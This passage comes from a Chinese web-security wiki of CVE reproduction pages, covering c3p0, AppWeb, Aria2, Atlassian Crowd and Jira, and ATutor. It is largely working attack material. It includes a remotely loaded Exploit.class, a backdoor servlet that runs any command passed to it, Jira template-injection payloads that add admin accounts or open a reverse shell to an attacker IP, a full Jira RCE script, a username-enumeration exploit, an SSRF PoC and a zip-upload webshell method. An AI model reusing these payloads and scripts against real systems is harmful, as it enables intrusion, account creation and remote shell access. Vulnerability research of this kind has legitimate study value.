jM2xXYlc1NlJHUlphbHBMZWpVemRXeHpUVEZtVjNkR1lrOVRRelYwWkROWE9XVkJTM2hPVm5CUE9VOVFRbEJzWVZJd2J5OXFkV1ZrYjNnMmRGZDVWRFEwUlZsVVlXZ3pPVXcwT0ZrclFXNDFlRGcxYUdwNVlXeHVNV3BYVEVSc2MzSnNVRU5MU0ZoV2NYb3JNMmM5UFEuUHlVb1FOdWNYS01Ra1lJZllZQ1FJaXUwQTROUkdzaExCOGMxMHczYzRWRDhHVmI1ZjRMbjZXQllmVUtKVU5FREpwZjl0ckd6N0pQTHJVLXlpMWRSRkE= 在自己的vps上编译Exploit.java，生成Exploit.class public class Exploit { public Exploit(){ try { java.lang.Runtime.getRuntime().exec( new String[]{\"cmd.exe\",\"/C\",\"calc.exe\"} ); } catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } // javac Exploit.java 生成Exploit.class // python3 -m http.server 60006 截取cas的登录包，替换execution参数 vps上可以看到c3p0远程加载了class 参考链接 https://app.yinxiang.com/fx/83617723-790c-4a9e-b884-f6831e2acf78 https://xz.aliyun.com/t/7032\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:40 "},"Web安全/AppWeb/（CVE-2018-8715）AppWeb认证绕过漏洞/（CVE-2018-8715）AppWeb认证绕过漏洞.html":{"url":"Web安全/AppWeb/（CVE-2018-8715）AppWeb认证绕过漏洞/（CVE-2018-8715）AppWeb认证绕过漏洞.html","title":"（CVE-2018-8715）AppWeb认证绕过漏洞","keywords":"","body":"（CVE-2018-8715）AppWeb认证绕过漏洞 一、漏洞简介 AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。 AppWeb可以进行认证配置，其认证方式包括以下三种： basic 传统HTTP基础认证 digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头 form 表单认证 其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。 二、漏洞影响 AppWeb \\ 三、复现过程 利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为admin。 构造头Authorization: Digest username=admin，并发送如下数据包： GET / HTTP/1.1 Host: example.com Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Authorization: Digest username=admin 可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session： AppWeb认证绕过漏洞/media/rId24.png) 设置这个session到浏览器，即可正常访问需要认证的页面： AppWeb认证绕过漏洞/media/rId25.png) 参考链接 https://vulhub.org/\\#/environments/appweb/CVE-2018-8715/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:43 "},"Web安全/Aria2/（CVE-2016-3088）Aria2 任意文件写入漏洞/（CVE-2016-3088）Aria2 任意文件写入漏洞.html":{"url":"Web安全/Aria2/（CVE-2016-3088）Aria2 任意文件写入漏洞/（CVE-2016-3088）Aria2 任意文件写入漏洞.html","title":"（CVE-2016-3088）Aria2 任意文件写入漏洞","keywords":"","body":"（CVE-2016-3088）Aria2 任意文件写入漏洞 一、漏洞简介 Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。 二、漏洞影响 Aria2 \\ 三、复现过程 因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 http://binux.github.io/yaaw/demo/ 。 https://github.com/ianxtianxt/yaaw 源码在这里，也可自行搭建。 打开yaaw，点击配置按钮，填入运行aria2的目标域名：http://your-ip:6800/jsonrpc: Aria2任意文件写入漏洞/media/rId24.png) 然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell： Aria2任意文件写入漏洞/media/rId25.png) 这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell： Aria2任意文件写入漏洞/media/rId26.png) 如果反弹不成功，注意crontab文件的格式，以及换行符必须是\\n，且文件结尾需要有一个换行符。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:44 "},"Web安全/Atlassian Crowd/CVE-2019-11580 Atlassian Crowd RCE/CVE-2019-11580 Atlassian Crowd RCE.html":{"url":"Web安全/Atlassian Crowd/CVE-2019-11580 Atlassian Crowd RCE/CVE-2019-11580 Atlassian Crowd RCE.html","title":"CVE 2019 11580 Atlassian Crowd RCE","keywords":"","body":"CVE-2019-11580 Atlassian Crowd RCE 简介 攻击者可利用代码执行漏洞，在服务端执行任意代码，实现系统信息窃取等目标，从而造成巨大危害。Atlassian Crowd是一款企业身份管理应用，具有身份管理和单点登录功能，且通过插件进一步扩展了功能。Atlassian Crowd的插件pdkinstall中存在安全缺陷，易导致攻击者上传安装恶意插件进而达到远程代码执行的目的。 代码分析 本节主要分析Atlassian Crowd的pdkinstall插件信息。输入命令【git clone https://bitbucket.org/atlassian/pdkinstall-plugin】 下载插件源码，使用IDEA打开，如下图。 首先，分析插件描述文件【atlassian-plugin.xml】。此文件采用XML格式数据重点说明插件模块与servlet的关联信息，内容如下。 图中标红区域说明，访问/admin/uploadplugin.action会调用servlet功能类com.atlassian.pdkinstall.PdkInstallFilter，完成新插件的上传、检测和安装过程。因此锁定此类为安全缺陷入口。 接着，分析其源码。在源码中，doFilter()函数是核心函数，涉及关键插件逻辑控制语句，因此我们分两部分来分析该函数源码。第1部分的源码及解析如下。 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse res = (HttpServletResponse) servletResponse; // 不是post请求，就报错 if (!req.getMethod().equalsIgnoreCase(“post”)) { res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Requires post”); return; } // 检查是否是multipart格式数据。 // 数据包中，Content-Type用于表示资源的MIME类型，multipart/mixed类型主要用于传输有效的（二进制数据等）数据文件。 // Check that we have a file upload request File tmp = null; boolean isMultipart = ServletFileUpload.isMultipartContent(req); if (isMultipart) { // 直接从数据包中提取jar文件继续安装插件 tmp = extractJar(req, res, tmp); } else { // 从数据包中组合数据构建、安装插件 tmp = buildJarFromFiles(req); } 此方法首先判别准入POST请求，随后检查数据包的Conten-Type类型是否是multipart：如是，则直接从数据包中提取jar文件插件；否则，从数据包中构建安装jar文件插件。 由于此函数代码后续跟进tmp变量开展判别任务，因此我们有必要深入相关函数分析返回的tmp变量值信息。进入extractJar(）函数分析jar文件插件提取过程，如下；buildJarFromFiles()函数分析过程类似，在此不赘述。 private File extractJar(HttpServletRequest req, HttpServletResponse res, File tmp) throws IOException { // Create a new file upload handler ServletFileUpload upload = new ServletFileUpload(factory); // Parse the request try { // 新建的文件上传实例会解析请求数据包，从而解析multipart/mixed格式的插件 List items = upload.parseRequest(req); for (FileItem item: items) { // 如果解析所得的数据字段以“file”开头且不属于表格字段，则判定为插件信息，据此创建插件，插件在服务端的索引位置保存在tmp变量中 if (item.getFieldName().startsWith(“file“) && !item.isFormField()) { tmp = File.createTempFile(“plugindev - “, item.getName()); tmp.renameTo(new File(tmp.getParentFile(), item.getName())); item.write(tmp); } } } catch(FileUploadException e) { log.warn(e, e); res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Unable to process file upload”); } catch(Exception e) { log.warn(e, e); res.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, “Unable to process file upload”); } // 返回插件索引位置信息 return tmp; } 分析可知，如果数据包中存在以 ”file_” 开头且非表单字段的文件，则据此创建插件，并将插件的服务端位置索引保存至tmp变量中；否则，保持tmp变量为 “null”。最终返回tmp变量。 接着继续分析doFilter() 函数的第2部分，如下。 // tmp不为空，确定是插件上传安装请求且插件已被探测并上传，开始安装此插件，否则响应信息“Missing plugin file” if (tmp != null) { List errors = new ArrayList (); try { // 安装插件 errors.addAll(pluginInstaller.install(tmp)); } catch(Exception ex) { log.error(ex); errors.add(ex.getMessage()); } tmp.delete(); if (errors.isEmpty()) { // 安装成功，响应“Installed plugin”+“具体路径” res.setStatus(HttpServletResponse.SC_OK); servletResponse.setContentType(“text / plain”); servletResponse.getWriter().println(“Installed plugin“ + tmp.getPath()); } else { // 安装失败，响应“Unable to install plugin:” res.setStatus(HttpServletResponse.SC_BAD_REQUEST); servletResponse.setContentType(“text / plain”); servletResponse.getWriter().println(“Unable to install plugin: ”); for (String err: errors) { servletResponse.getWriter().println(“\\t - “ + err); } } servletResponse.getWriter().close(); return; } res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Missing plugin file”); } 分析可知，如tmp变量不为空，则开始安装插件，且安装成功返回响应信息 “Installed plugin” +“具体路径”，安装失败返回响应信息 ”Unable to install plugin:”；如 tmp变量为空，则返回响应信息 “Missing plugin file”。 至此，明确Atlassian Crowd的插件管理流程后可知，并不存在明确的插件功能检测机制，因此插件易被利用。 漏洞利用 首先，编写一个恶意插件，其 “atlassian-plugin.xml” 信息如下。 true Atlassian Management plugin 1.0.0 /exp backdoor at /plugins/servlet/cdl 分析可知，插件上传成功后，用户只需访问 /exp即可使用恶意插件servlet类com.cdl.shell.exp的功能。 其次，分析com.cdl.shell.exp源码，如下： public class exp extends javax.servlet.http.HttpServlet { public void doGet(HttpServletRequest req, HttpServletResponse res) { try { // 接收cmd参数信息 String cmd = String.valueOf(req.getParameter(“cmd”)); String output = ””; try { if (!cmd.equals(“”)) { // 执行cmd参数命令 Process p = Runtime.getRuntime().exec(cmd); InputStream out = p.getInputStream(); InputStream err = p.getErrorStream(); int c = ’\\0’; while ((c = out.read()) != -1) { res.getWriter().write((char) c); } } } catch(Exception ex) { output += ”\\n” + ex.toString(); } } catch(Exception e) { e.printStackTrace(); } } } 从中可知，此exp的功能是读取并执行 cmd参数值。 最后，编辑请求数据包以便上传恶意插件，接着在浏览器输入【http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami】即可执行 “whoami” 命令。观察服务端的响应信息（如下），可知漏洞利用成功。 复现 第一步，下载【atlassian-crowd-3.4.3】。配置启动后，访问【http://localhost:8095/crowd】， 最终出现如下界面说明crowd服务搭建成功。 第二步，访问链接【https://github.com/jas502n/CVE-2019-11580】 下载恶意插件等资料，随后执行【CVE-2019-11580.py】脚本，出现如下界面说明插件上传、安装成功。 第三步，在浏览器访问链接【http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami】， 如出现如下界面，说明成功触发代码执行漏洞。 补丁 升级至最新版。 总结 通过分析Atlassian Crowd RCE，作者认为此漏洞的根本原因在于插件管理系统未全面测试外来插件的安全性；在相关漏洞研究学习中，我们应当提升Atlassian Crowd动态调试能力，插件分析开发能力，以及Java 和Python的开发能力。 参考文献 1、 jas502n/CVE-2019-11580: CVE-2019-11580 Atlassian Crowd and Crowd Data Center RCE https://github.com/jas502n/CVE-2019-11580 2、 CVE-2019-11580：Atlassian Crowd RCE漏洞分析 – 安全客，安全资讯平台 https://www.anquanke.com/post/id/182118#h2-5 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:45 "},"Web安全/Atlassian Jira/（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞/（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞.html":{"url":"Web安全/Atlassian Jira/（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞/（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞.html","title":"（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞","keywords":"","body":"（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞 一、漏洞简介 此漏洞由于Atlassian Jira中的Atlassian Jira Server和Jira Data Center模块存在模板注入，当\"联系管理员表单\"功能开启时，攻击者可以在表单插入java恶意代码,当服务端对传入数据进行解析时,会执行数据中插入的恶意代码,并执行其中的命令。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。 二、漏洞影响 Atlassian Jira 4.4.xAtlassian Jira 5.x.xAtlassian Jira 6.x.xAtlassian Jira 7.0.xAtlassian Jira 7.1.xAtlassian Jira 7.2.xAtlassian Jira 7.3.xAtlassian Jira 7.4.xAtlassian Jira 7.5.xAtlassian Jira 7.6.x \\ 三、复现过程 漏洞分析 1.利用前提条件： 第一种，未授权代码执行利用条件：Jira已配置好SMTP服务器，且需开启\"联系网站管理员表单\"功能。（从WEB界面设计上看，实际上如果没配置SMTP服务器，无法开启此功能 第二种利用场景前提是拿到Jira管理员的权限，利用条件较难满足，这里主要分析第一种情况。原因在于atlassian-jira/WEB-INF/classes/com/atlassian/jira/web/action/user/ContactAdministrators 未对Subject（邮件主题）处进行过滤，用户传入的邮件主题被当作template（模板）指令执行。在任何一种情况下，成功利用此漏洞的攻击者都可在运行受影响版本的Jira Server或Jira Data Center的系统上执行任意命令。 2.以下两种url漏洞验证方式： 第一种无需管理员账户权限：http://www.0-sec.org:8080[/secure/ContactAdministrators!default.jspa](http://ip:port/secure/ContactAdministrators!default.jspa) AtlassianJira远程命令执行漏洞/media/rId26.png) 第二种需管理员账户权限：http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa AtlassianJira远程命令执行漏洞/media/rId27.png) 漏洞复现 1. 漏洞利用条件 联系管理员处必须开启 （需要知道后台管理员账号密码） 2.环境准备： Atlassian JIRAv7.13.0 (以该版本为例，该版本存在漏洞)下载地址： https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-7.13.0-x64.exe 安装过程不再描述（按照提示进行安装，先在官方注册一个账号然后拿到一个试用期序列号并进行安装），注意，到了邮件配置那一步经尽量选以后(默认就是)，然后进入后台配置。 3.确认未登陆状态下漏洞的存在 访问如下URL（无需管理员账户权限）： http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa 如果提示如下图，这说明没有配置联系管理员是无法触发漏洞。 AtlassianJira远程命令执行漏洞/media/rId29.png) 请登陆后台开启联系管理员，配置地址如下： http://www.0-sec.org:8080/secure/admin/EditApplicationProperties!default.jspa 默认是关闭的，需要配置了STMP发信后才能开启，配置STMP的时候可以测试连接，服务器必须开25端口，不然不能发邮件，下图是开启成功 AtlassianJira远程命令执行漏洞/media/rId30.png) 4.未登陆状态下触发漏洞 访问 http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa AtlassianJira远程命令执行漏洞/media/rId31.png) 在Subject填入payload，注意，我这里环境是windows机器，所以可以添加账号观察，Linux可以用反弹shell的代码等等,反正换成自己想执行的命令。 $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk abc@ABC123 /add').waitFor() AtlassianJira远程命令执行漏洞/media/rId32.png) 发送了后可能会等一会儿，因为要加入邮件队列。这时候再上服务器执行net user查看，发现正是刚刚执行命令添加的账户。 AtlassianJira远程命令执行漏洞/media/rId33.png) 5. 登陆管理员账号触发漏洞 登陆管理员账号，然后访问如下URL： http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa 填入payload，如下，注意执行命令添加账号的账户名 $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk01 abc@ABC123 /add').waitFor() AtlassianJira远程命令执行漏洞/media/rId34.png) AtlassianJira远程命令执行漏洞/media/rId35.png) linux下可执行： 目标Jira系统可执行的POC $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://www.baidu.com').waitFor() $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -i >& /dev/tcp/攻击者IP/2333 0>&1').waitFor() 攻击者主机执行:nc -lvvp 2333 poc scan #/usr/bin/python # -*- coding: utf8 -*- # # the program intents to automate the process of exploiting CVE-2019-11581 During our engagments - quick and dirty # I will probably will add features to make it more easy. # Ths is some skeleton and probably things will not work on first run # Importing import requests import sys import argparse from bs4 import BeautifulSoup import cmd parser = argparse.ArgumentParser() parser.add_argument(\"domain\", help=\"JIRA Instance\") parser.add_argument(\"cmd\", help=\"Command to run\") args = parser.parse_args() #Some Debugging Globals http_proxy = \"http://127.0.0.1:8080\" https_proxy = \"https://127.0.0.1:8080\" ftp_proxy = \"ftp://127.0.0.1:8080\" #Proxy Dictionary proxyDict = { \"http\" : http_proxy, \"https\" : https_proxy } headers = {'UserAgent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0'} def JiraScan(domain,cmd): #Filtering host domain = domain + '/secure/ContactAdministrators!default.jspa' #Checking if host is vulnerable by checking if specific string is present s = requests.Session() r = s.get(domain, proxies=proxyDict, verify=False) html_doc = r.content soup = BeautifulSoup(html_doc, 'lxml') notvuln = soup.findAll(\"div\",{\"class\":\"aui-message aui-message-warning warningd\"}) if notvuln: print \"[-] Not Vulnerable\" else: print \"[+] Checking if Vulnerable\" #In order to have valid request we need to handle JIRA CSRF Tokens #Extracting atl_token from form html_doc = r.content soup = BeautifulSoup(html_doc, 'lxml') data = soup.findAll(attrs={\"name\" : \"atl_token\"}) print data #Returning Token value token = data[0]['value'] print token #Replacing path domain= domain.replace('!default.jspa','.jspa') # body of post request #(),'subject':\"\",'details':\",'atl_token': value,'Send':'Send'} payload = \"$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('%s').waitFor()\" % cmd qparams = (('from','JIRA@JIRA.com'),('subject',payload),('details',payload),('atl_token',token),('Send','Send')) #Final Payload attack = s.post(domain, headers = headers, data = qparams, proxies=proxyDict, verify=False) if __name__ == '__main__': JiraScan(args.domain,args.cmd) 参考链接 https://www.cnblogs.com/backlion/p/11608439.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:48 "},"Web安全/Atlassian Jira/（CVE-2019-8449）Atlassian Jira 信息泄露漏洞/（CVE-2019-8449）Atlassian Jira 信息泄露漏洞.html":{"url":"Web安全/Atlassian Jira/（CVE-2019-8449）Atlassian Jira 信息泄露漏洞/（CVE-2019-8449）Atlassian Jira 信息泄露漏洞.html","title":"（CVE-2019-8449）Atlassian Jira 信息泄露漏洞","keywords":"","body":"（CVE-2019-8449）Atlassian Jira 信息泄露漏洞 一、漏洞简介 Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 Atlassian Jira 8.4.0之前版本中的/rest/api/latest/groupuserpicker资源存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。 二、漏洞影响 Atlassian Jira 7.12\\ 三、复现过程 某JIRA站点www.0-sec.org 我以目标是虚假的情况下，www.0-sec.org没有zerosec用户进行请求 GET /rest/api/latest/groupuserpicker?query=zerosec&maxResults=50&showAvatar=false HTTP/1.1 Host: www.0-sec.org Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 该站点会返回一串json数据，说明找不到该用户 {\"users\":{\"users\":[],\"total\":0,\"header\":\"显示 0 匹配的用户(共 0个)\"},\"groups\":{\"header\":\"显示 0 个匹配的组(共 0个)\",\"total\":0,\"groups\":[]}} 但是当我以一个已知用户身份测试时 GET /rest/api/latest/groupuserpicker?query=DesMond&maxResults=50&showAvatar=false HTTP/1.1 Host: www.0-sec.org Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 会返回相应用户的一些信息 {\"users\":{\"users\":[{\"name\":\"Desmond\",\"key\":\"Desmond\",\"html\":\"Desmond(Des)-test (Desmond)\",\"displayName\":\"Desmond(Des)-test\"}],\"total\":1,\"header\":\"显示 1 匹配的用户(共 1个)\"},\"groups\":{\"header\":\"显示 0 个匹配的组(共 0个)\",\"total\":0,\"groups\":[]}} poc CVE-2019-8449.py # Exploit Title: Jira 8.3.4 - Information Disclosure (Username Enumeration) # Date: 2019-09-11 # Exploit Author: Mufeed VH # Vendor Homepage: https://www.atlassian.com/ # Software Link: https://www.atlassian.com/software/jira # Version: 8.3.4 # Tested on: Pop!_OS 19.10 # CVE : CVE-2019-8449 # CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4 # DETAILS :: https://www.cvedetails.com/cve/CVE-2019-8449/ # CONFIRM :: https://jira.atlassian.com/browse/JRASERVER-69796 #!/usr/bin/env python __author__ = \"Mufeed VH (@mufeedvh)\" import os import requests class CVE_2019_8449: def ask_for_domain(self): domain = raw_input(\"[>] Enter the domain of Jira instance: => \") if domain == \"\": print(\"\\n[-] ERROR: domain is required\\n\") self.ask_for_domain() self.url = \"https://{}/rest/api/latest/groupuserpicker\".format(domain) def ask_for_query(self): self.query = raw_input(\"[>] Enter search query: [required] (Example: admin) => \") if self.query == \"\": print(\"\\n[-] ERROR: The query parameter is required\\n\") self.ask_for_query() def exploit(self): self.ask_for_domain() self.ask_for_query() maxResults = raw_input(\"\\n[>] Enter the number of maximum results to fetch: (50) => \") showAvatar = raw_input(\"\\n[>] Enter 'true' or 'false' whether to show Avatar of the user or not: (false) => \") fieldId = raw_input(\"\\n[>] Enter the fieldId to fetch: => \") projectId = raw_input(\"\\n[>] Enter the projectId to fetch: => \") issueTypeId = raw_input(\"\\n[>] Enter the issueTypeId to fetch: => \") avatarSize = raw_input(\"\\n[>] Enter the size of Avatar to fetch: (xsmall) => \") caseInsensitive = raw_input(\"\\n[>] Enter 'true' or 'false' whether to show results case insensitive or not: (false) => \") excludeConnectAddons = raw_input(\"\\n[>] Indicates whether Connect app users and groups should be excluded from the search results. If an invalid value is provided, the default value is used: (false) => \") params = { 'query': self.query, 'maxResults': maxResults, 'showAvatar': showAvatar, 'fieldId': fieldId, 'projectId': projectId, 'issueTypeId': issueTypeId, 'avatarSize': avatarSize, 'caseInsensitive': caseInsensitive, 'excludeConnectAddons': excludeConnectAddons } send_it = requests.get(url = self.url, params = params) try: response = send_it.json() except: print(\"\\n[-] ERROR: Something went wrong, the request didn't respond with a JSON result.\") print(\"[-] INFO: It is likely that the domain you've entered is wrong or this Jira instance is not exploitable.\") print(\"[-] INFO: Try visting the target endpoint manually ({}) and confirm the endpoint is accessible.\".format(self.url)) quit() print(\"\\n\\n\") print(response) print(\"\\n\\n\") if __name__ == '__main__': os.system('cls' if os.name == 'nt' else 'clear') print(''' ================================================ | | | CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4 | | Proof of Concept By: Mufeed VH [@mufeedvh] | | | ================================================ ''') CVE_2019_8449().exploit() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:46 "},"Web安全/Atlassian Jira/（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证/（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证.html":{"url":"Web安全/Atlassian Jira/（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证/（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证.html","title":"（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证","keywords":"","body":"（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证 一、漏洞简介 二、影响范围 Atlassian Jira \\ 三、复现过程 AtlassianJira未授权SSRF漏洞验证/media/rId24.png) https://github.com/ianxtianxt/CVE-2019-8451 #coding:utf-8 import requests host = 'http://xx.xx.xx.xx:8080' header = { 'X-Atlassian-Token': 'no-check', 'Connection': 'close' } url = host + '/plugins/servlet/gadgets/makeRequest?url='+host+'@www.baidu.com/' html = requests.get(url = url,headers = header) print html.text Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:47 "},"Web安全/ATutor/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞.html":{"url":"Web安全/ATutor/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞.html","title":"（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞","keywords":"","body":"（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞 一、漏洞简介 ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、 Moddle及Sakai号称为四大开源课程管理系统。 ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可利用该漏洞进行远程代码执行攻击。 经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。 二、漏洞影响 ATutor 2.2.4 三、复现过程 据漏洞披露可知，漏洞触发点存在于mods/_core/languages/language_import.php文件中 首先跟入language_import.php文件 PHP import($_POST['language']); header('Location: language_import.php'); exit; } else if (isset($_POST['submit']) && (!is_uploaded_file($_FILES['file']['tmp_name']) || !$_FILES['file']['size'])) { $msg->addError('LANG_IMPORT_FAILED'); } else if (isset($_POST['submit']) && !$_FILES['file']['name']) { $msg->addError('IMPORTFILE_EMPTY'); } else if (isset($_POST['submit']) && is_uploaded_file($_FILES['file']['tmp_name'])) { $languageManager->import($_FILES['file']['tmp_name']); header('Location: ./language_import.php'); exit; } 从language_import.php文件中35行起，可以发现文件上传相关代码 ATutor学习内容管理系统任意文件上传漏洞/media/rId24.png) 从上图红框中代码可知，此处代码块是对文件上传情况进行校验 在文件成功上传后，进入下一个if分支 ATutor学习内容管理系统任意文件上传漏洞/media/rId25.png) 在这个分支里，程序将调用$languageManager->import方法对文件进行处理 继续跟入import方法，位于/mods/_core/languages/classes/LanguageManager.class.php文件中 PHP // public // import language pack from specified file function import($filename) { global $languageManager, $msg; if(strstr($_FILES['file']['name'], 'master')){ // hack to create path to subdir for imported github language packs $import_dir = str_replace(\".zip\", \"\", $_FILES['file']['name']).'/'; } else if(isset($_POST['language'])){ $import_dir = $_POST['language'].'-master/'; } require_once(AT_INCLUDE_PATH.'classes/pclzip.lib.php'); require_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguagesParser.class.php'); $import_path = AT_CONTENT_DIR . 'import/'; $import_path_tmp = $import_path.$import_dir; $language_xml = @file_get_contents($import_path.'language.xml'); $archive = new PclZip($filename); if ($archive->extract( PCLZIP_OPT_PATH, $import_path) == 0) { exit('Error : ' . $archive->errorInfo(true)); } 在import方法中程序调用PclZip对压缩包进行处理 PHP $archive = new PclZip($filename); if ($archive->extract( PCLZIP_OPT_PATH, $import_path) == 0) { exit('Error : ' . $archive->errorInfo(true)); } 为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php PHP 将这个poc.php打包为poc.zip ATutor学习内容管理系统任意文件上传漏洞/media/rId26.png) 访问如下链接以进入上传页面 https://www.0-sec.org/ATutor/mods/_core/languages/language_import.php ATutor学习内容管理系统任意文件上传漏洞/media/rId27.png) 在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处 ATutor学习内容管理系统任意文件上传漏洞/media/rId28.png) 此时的$import_path值为atutor应用的/content/import路径：\"content/import/\"，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类 PclZip PclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。 我们接下来看下import方法中是如何使用PclZip，见下图 ATutor学习内容管理系统任意文件上传漏洞/media/rId29.png) 程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值 我们来看下PCLZIP_OPT_PATH设置项的作用 ATutor学习内容管理系统任意文件上传漏洞/media/rId30.png) 可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为$import_path参数对应的路径 解压成功后，poc.zip中内容出现在对应文件夹中 ATutor学习内容管理系统任意文件上传漏洞/media/rId31.png) 查看poc.php中的值，可以发现poc上传成功 ATutor学习内容管理系统任意文件上传漏洞/media/rId32.png) 访问如下地址，触发poc ATutor学习内容管理系统任意文件上传漏洞/media/rId33.png) 除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子： 位于mods/_core/themes/import.php文件中的主题导入功能,代码如下: PHP /** * Imports a theme from a URL or Zip file to Atutor * @access private * @author Shozub Qureshi */ function import_theme() { global $db; global $msg; if 